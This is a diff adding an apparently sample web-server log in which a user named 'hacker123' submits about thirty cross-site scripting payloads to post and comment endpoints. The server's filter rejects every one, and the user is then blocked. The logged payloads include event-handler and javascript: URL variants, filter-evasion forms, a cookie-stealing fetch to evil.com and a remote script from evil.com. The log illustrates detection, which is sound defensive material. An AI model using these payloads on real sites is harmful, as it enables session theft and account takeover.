@@ -1,0 +1,99 @@
+[2026-01-05 14:30:00] INFO Server is running on port 3333
+[2026-01-05 14:30:01] INFO Database connected successfully
+[2026-01-05 14:30:05] INFO GET /api/posts?page=1&limit=10 200 - 44ms
+[2026-01-05 14:30:08] INFO POST /login 200 - 119ms - User: hacker123
+[2026-01-05 14:30:10] INFO GET /api/profile 200 - 33ms - User: hacker123
+[2026-01-05 14:30:15] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:15] WARN Dangerous HTML content detected: <script>alert('XSS')</script>
+[2026-01-05 14:30:15] ERROR POST /api/posts 400 - 23ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:18] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:18] WARN Dangerous HTML content detected: <img src=x onerror=alert(1)>
+[2026-01-05 14:30:18] ERROR POST /api/posts 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:20] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:20] WARN Dangerous HTML content detected: <svg onload=alert(1)>
+[2026-01-05 14:30:20] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:22] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:22] WARN Dangerous HTML content detected: javascript:void(0)
+[2026-01-05 14:30:22] ERROR POST /api/posts 400 - 18ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:25] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:30:25] WARN Dangerous HTML content detected: <iframe src=javascript:alert(1)>
+[2026-01-05 14:30:25] ERROR POST /api/comments 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:28] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:28] WARN Dangerous HTML content detected: <body onload=alert('XSS')>
+[2026-01-05 14:30:28] ERROR POST /api/posts 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:30] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:30:30] WARN Dangerous HTML content detected: <input onfocus=alert(1) autofocus>
+[2026-01-05 14:30:30] ERROR POST /api/comments 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:33] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:33] WARN Dangerous HTML content detected: <select onfocus=alert(1) autofocus>
+[2026-01-05 14:30:33] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:35] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:35] WARN Dangerous HTML content detected: <textarea onfocus=alert(1) autofocus>
+[2026-01-05 14:30:35] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:38] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:30:38] WARN Dangerous HTML content detected: <marquee onstart=alert(1)>
+[2026-01-05 14:30:38] ERROR POST /api/comments 400 - 18ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:40] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:40] WARN Dangerous HTML content detected: <script>document.cookie</script>
+[2026-01-05 14:30:40] ERROR POST /api/posts 400 - 23ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:42] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:42] WARN Dangerous HTML content detected: <img src=x onerror=fetch('http://evil.com?c='+document.cookie)>
+[2026-01-05 14:30:42] ERROR POST /api/posts 400 - 24ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:45] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:30:45] WARN Dangerous HTML content detected: <svg><script>alert(1)</script></svg>
+[2026-01-05 14:30:45] ERROR POST /api/comments 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:47] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:47] WARN Dangerous HTML content detected: <object data="javascript:alert(1)">
+[2026-01-05 14:30:47] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:50] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:50] WARN Dangerous HTML content detected: <embed src="javascript:alert(1)">
+[2026-01-05 14:30:50] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:52] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:30:52] WARN Dangerous HTML content detected: <a href="javascript:alert(1)">Click</a>
+[2026-01-05 14:30:52] ERROR POST /api/comments 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:55] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:55] WARN Dangerous HTML content detected: <form action="javascript:alert(1)">
+[2026-01-05 14:30:55] ERROR POST /api/posts 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:30:57] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:30:57] WARN Dangerous HTML content detected: <button onclick="alert(1)">
+[2026-01-05 14:30:57] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:00] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:31:00] WARN Dangerous HTML content detected: <div onmouseover="alert(1)">
+[2026-01-05 14:31:00] ERROR POST /api/comments 400 - 18ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:02] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:02] WARN Dangerous HTML content detected: <table background="javascript:alert(1)">
+[2026-01-05 14:31:02] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:05] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:05] WARN Dangerous HTML content detected: <style>@import'javascript:alert(1)';</style>
+[2026-01-05 14:31:05] ERROR POST /api/posts 400 - 23ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:07] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:31:07] WARN Dangerous HTML content detected: <link rel="stylesheet" href="javascript:alert(1)">
+[2026-01-05 14:31:07] ERROR POST /api/comments 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:10] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:10] WARN Dangerous HTML content detected: <meta http-equiv="refresh" content="0;javascript:alert(1)">
+[2026-01-05 14:31:10] ERROR POST /api/posts 400 - 24ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:12] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:12] WARN Dangerous HTML content detected: <video><source onerror="alert(1)">
+[2026-01-05 14:31:12] ERROR POST /api/posts 400 - 20ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:15] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:31:15] WARN Dangerous HTML content detected: <audio><source onerror="alert(1)">
+[2026-01-05 14:31:15] ERROR POST /api/comments 400 - 19ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:17] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:17] WARN Dangerous HTML content detected: <details open ontoggle="alert(1)">
+[2026-01-05 14:31:17] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:20] WARN Security alert: User hacker123 attempted 25 XSS attacks in 1 minute
+[2026-01-05 14:31:20] WARN Recommend blocking user: hacker123 (IP: 192.168.1.250)
+[2026-01-05 14:31:22] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:22] WARN Dangerous HTML content detected: <script src="http://evil.com/xss.js"></script>
+[2026-01-05 14:31:22] ERROR POST /api/posts 400 - 23ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:25] INFO POST /api/comments - User: hacker123
+[2026-01-05 14:31:25] WARN Dangerous HTML content detected: "><script>alert(String.fromCharCode(88,83,83))</script>
+[2026-01-05 14:31:25] ERROR POST /api/comments 400 - 24ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:28] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:28] WARN Dangerous HTML content detected: <scr<script>ipt>alert(1)</scr</script>ipt>
+[2026-01-05 14:31:28] ERROR POST /api/posts 400 - 22ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:30] INFO POST /api/posts - User: hacker123
+[2026-01-05 14:31:30] WARN Dangerous HTML content detected: %3Cscript%3Ealert(1)%3C/script%3E
+[2026-01-05 14:31:30] ERROR POST /api/posts 400 - 21ms - 허용되지 않는 HTML 태그나 스크립트가 포함되어 있습니다
+[2026-01-05 14:31:35] WARN Security alert: Total 30 XSS attack attempts from user hacker123
+[2026-01-05 14:31:35] ERROR Blocking user hacker123 due to repeated security violations
